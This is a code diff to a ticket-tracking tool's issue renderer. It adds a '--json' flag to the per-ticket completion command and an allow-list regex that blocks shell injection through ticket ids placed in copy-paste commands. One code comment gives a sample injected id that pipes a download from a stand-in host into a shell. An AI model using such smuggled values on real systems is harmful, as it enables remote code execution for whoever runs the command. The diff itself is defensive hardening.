@@ -48,11 +48,10 @@ const DRY_RUN_CMD = 'adlc ticket-prune --base-ref origin/main        # dry run: 
 
 // The completion command is PER-TICKET and canonical, not a bulk sweep.
 //
-// `adlc-tickets complete <id> --write --authorize` goes through TicketService's
-// transaction: it completes exactly the named ticket, validates the expected
-// snapshot (CAS), holds the worktree lock, journals, and records completion
-// evidence to `.adlc/manifest.jsonl`. It works identically on the tickets.json
-// and directory backends (verified on both).
+// `adlc-tickets complete <id> --write --authorize --json` goes through
+// TicketService's transaction: it completes exactly the named ticket, validates
+// the expected snapshot (CAS), holds the worktree lock, journals, and records
+// completion evidence to `.adlc/manifest.jsonl`. Works on both backends.
 //
 // This replaces two earlier remedies, and fixes what each got wrong:
 //   - the bulk `ticket-prune --ceremony`, which recomputed its own target set at
@@ -63,9 +62,27 @@ const DRY_RUN_CMD = 'adlc ticket-prune --base-ref origin/main        # dry run: 
 //     bypassed the lock, CAS, journal, and manifest evidence the directory
 //     contract requires, and was not "the same minimal diff" it claimed to be.
 //
-// A per-ticket command is bound to one id, so neither problem exists: no
-// recomputation, no blast radius, and the write goes through the canonical path.
-const completeCmd = (id) => `adlc-tickets complete ${id} --write --authorize`;
+// `--json` is REQUIRED, not cosmetic: on a legacy store the CLI otherwise offers
+// an interactive migration before mutating (offerLegacyMigration, gated on a TTY
+// and `!--json`). An admin who accepted that prompt would migrate the WHOLE store
+// before completing one ticket — a repo-wide change outside the reviewed diff.
+// `--json` makes the command non-interactive, so it does exactly what is
+// advertised: complete one ticket, nothing else.
+const completeCmd = (id) => `adlc-tickets complete ${id} --write --authorize --json`;
+
+// A ticket id is interpolated into a copy-paste shell command in a bot-authored
+// issue. The id comes from the repo (a merged ticket), and the store validator
+// accepts arbitrary strings — so an id like `T7; curl evil | sh #` would render
+// as executable shell for an admin holding credentials. Only ids matching this
+// conservative shape (every real id does: T7, A142, T-01KX…, T-CC1) are rendered
+// as runnable commands; anything else is surfaced without a command instead of
+// being quoted-and-hoped. No shell metacharacter can pass this gate, so no
+// quoting is needed and injection is structurally impossible.
+// Must START with an alphanumeric, so an id can never be parsed as a flag
+// (`--authorize`, `-x`) even though those contain only otherwise-allowed
+// characters. Every real id qualifies (T7, A142, T-CC1, T-01KX…).
+const SAFE_TICKET_ID = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;
+const isRenderableId = (id) => typeof id === 'string' && SAFE_TICKET_ID.test(id);
 
 /**
  * Render the tracking-issue body. Deterministic: entries are sorted by id, so an
@@ -139,7 +156,11 @@ export function renderIssueBody(needsCeremony, { activeTicketId = null, activeTi
   // every checkout — NOT from the active-ticket pointer, which a CI checkout
   // cannot see (it is gitignored). That distinction is why the earlier
   // pointer-dependent gate was unsound and this is not.
-  const completable = confirmed; // already: rail-freezing, explicit-done, not active
+  // confirmed = rail-freezing, explicit-done, not active. Split by whether the id
+  // can be safely rendered into a shell command (see SAFE_TICKET_ID). An id that
+  // fails the gate still gets surfaced — just never as executable text.
+  const completable = confirmed.filter((t) => isRenderableId(t?.id));
+  const unsafeIds = confirmed.filter((t) => !isRenderableId(t?.id));
 
   // WHY THIS REPORT NEVER CERTIFIES THE COMMAND AS SAFE TO RUN
   //
@@ -297,7 +318,18 @@ export function renderIssueBody(needsCeremony, { activeTicketId = null, activeTi
               'indistinguishable from an active ticket editing existing files. Give each',
               'genuinely-done ticket an explicit done-`status` so it appears above, or, once',
               'you have verified one by hand, complete just that id:',
-              '`adlc-tickets complete <id> --write --authorize`.',
+              '`adlc-tickets complete <id> --write --authorize --json`.',
+              '',
+            ]
+          : []),
+        ...(unsafeIds.length
+          ? [
+              `⚠ ${unsafeIds.length} confirmed ticket(s) have an id that cannot be safely`,
+              'rendered as a shell command (it contains characters outside',
+              '`[A-Za-z0-9._-]`). No command is shown for them, deliberately — an id is',
+              'interpolated into copy-paste shell, and a crafted id could inject. Complete',
+              'them through tooling that takes the id as a real argument, and consider',
+              `renaming: ${unsafeIds.map((t) => '`' + String(t?.id) + '`').join(', ')}.`,
               '',
             ]
           : []),
